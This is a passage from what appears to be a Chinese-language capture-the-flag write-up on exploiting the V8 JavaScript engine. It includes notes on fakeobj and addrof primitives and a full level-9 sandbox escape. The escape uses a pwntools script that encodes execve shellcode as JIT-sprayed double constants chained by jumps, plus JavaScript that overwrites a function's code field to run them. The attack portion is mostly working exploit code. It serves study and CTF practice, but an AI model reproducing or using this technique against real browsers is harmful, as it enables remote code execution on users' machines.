- 如果for循环内调用`optimize_me_please(float_arr,13.37,false)`，即最后一个参数不是true，则fakeobj primitive会失效。个人猜测原因是optimize_me_please原本的设计是内部根据is_write的值分出if和else两个分支，可能这样会使v8忽略一个分支而只优化另一个分支？
- 在这里万物都会改变，只有double数组的map地址不会改变。我直接硬编码了`0x1cb7f9`，省了不少力
- 数组的元素所在的地址突然跑到`addrof(arr)+0x18`去了
- 一度认为是wasm_instance定义的位置干扰了arb_read，于是我把它移到了脚本较上方的位置。虽然后续发现没有关系，我也懒得改了
- 如果脚本失败的话，末尾的`while(1){}`会一直运行。好像即使我`ctrl+c`也kill不掉……
- 并非不难

据说接下来的level8很难。感觉旅途要在这里结束了 :(

## level9

level8确实很难，所以先看level9（

level9疑似level2的精神续作，直接给了任意读写的primitive。唯一的问题是开了沙盒，即使给了任意读写的primitive也写不出沙盒，而沙盒里也没有东西可以帮助我们拿到rce……吗？

搜相似题目时搜到了 https://ju256.rip/posts/kitctfctf22-date 。也是给了沙盒内的任意地址读写和`getAddressOf`，区别是这篇wp里没有JIT和wasm。emmm，我们有啊，于是顺藤摸瓜，摸到了 https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox 。这篇文章介绍了利用函数的JIT code实现rce的方法，具体操作是覆盖函数对应的code object内的code_entry_point字段。但不知为什么，可能是环境内的d8版本比较新，总之code_entry_point字段已经不存在了

但这个方法并非完全无法使用。我搜到了另一篇文章： https://tttang.com/archive/1443 ，仍然是利用函数的JIT code，只是覆盖的是函数对象内的code字段本身。当一个函数返回double数组时，其JIT汇编代码会存在一大段`REX.W movq r10, xxx`(pwndbg反汇编出来的指令名称和gdb有点不同，但无需担心，因为特征非常明显，调试肯定找得到)。xxx是数组的浮点数元素，占8个字节。如果我们来个字节错位，就能让这8个字节作为shellcode执行。当然8个字节是写不出什么有用的shellcode的，所以要用jmp将多段shellcode串联起来。jmp需要两个字节，于是剩下六个字节可以自由发挥。shellcode生成脚本如下：
```py
from pwn import *
import struct
context.arch='amd64'
shellcode="""push 0x6761
    push 1818653793; pop rbx
    push 1664050535; pop rcx
    shl rbx, 0x20
    add rbx, rcx; push rbx
    push 1852140652; pop rsi
    push 1634231087; pop rdx
    shl rsi, 0x20
    add rsi, rdx; push rsi
    mov rdi,rsp
    xor edx, edx
    xor esi, esi
    push SYS_execve
    pop rax
    syscall""".split('\n')
def convert(x):
    assert len(x)<=6
    jmp = b'\xeb\x0c'
    return x.ljust(6, b'\x90') + jmp
result=[]
for i in shellcode:
    part=i.lstrip()
    result.append(struct.unpack('d', convert(asm(part)))[0])
print(result)
```
一个烦人的地方在于，题目要求执行`/challenge/catflag`（似乎相对目录是不行的），长度远超8个字节，因此需要分批次写入。注意我在`push xxx; pop xxx`处均使用了不同的寄存器；第一段用rbx和rcx，第二段用rsi和rdx。我发现出现的汇编语句不能重复，因为重复的汇编语句会生成重复的浮点数，导致v8优化时会不遵循先前假设的结构，shellcode执行失败。此处可以在调试器中查看，当出现重复语句后，v8不再用`REX.W movq r10, xxx`来存取值，而是别的什么语句

最后就是看应该把函数对象的code字段覆盖成什么值了。推导过程可以看上面的文章，我这直接放公式：`原code字段值+(第一个REX.W movq语句出现地址+2-0x3f-原code字段值)`
```js
var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(sbxMemView);
var addrOf = (o) => Sandbox.getAddressOf(o);
var readHeap4 = (offset) => dv.getUint32(offset, true);   
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);   
const foo = ()=>
  {
      return [1.0,1.971025155501187e-246, 1.9563384012934637e-246, 1.9557696654558445e-246, 1.9711824228871598e-246, 1.971182639857203e-246, 1.957178600143391e-246, 1.9560470663288823e-246, 1.9711824229371098e-246, 1.9711826528275368e-246, 1.9711829003383248e-246, 1.9711828988945186e-246, 1.97118289889686e-246, 1.9711828988847122e-246, 1.971182898890236e-246, 1.971182898881177e-246];
  }
for (var huh=0; huh < 1000000; huh++) {
    foo();foo();foo();foo();
}
let code=readHeap4(addrOf(foo)+24);
writeHeap4(addrOf(foo)+24,code+0x7a);
foo();
```
没错就这么简单……返回的double数组开头的1.0用来满足跳转到shellcode的条件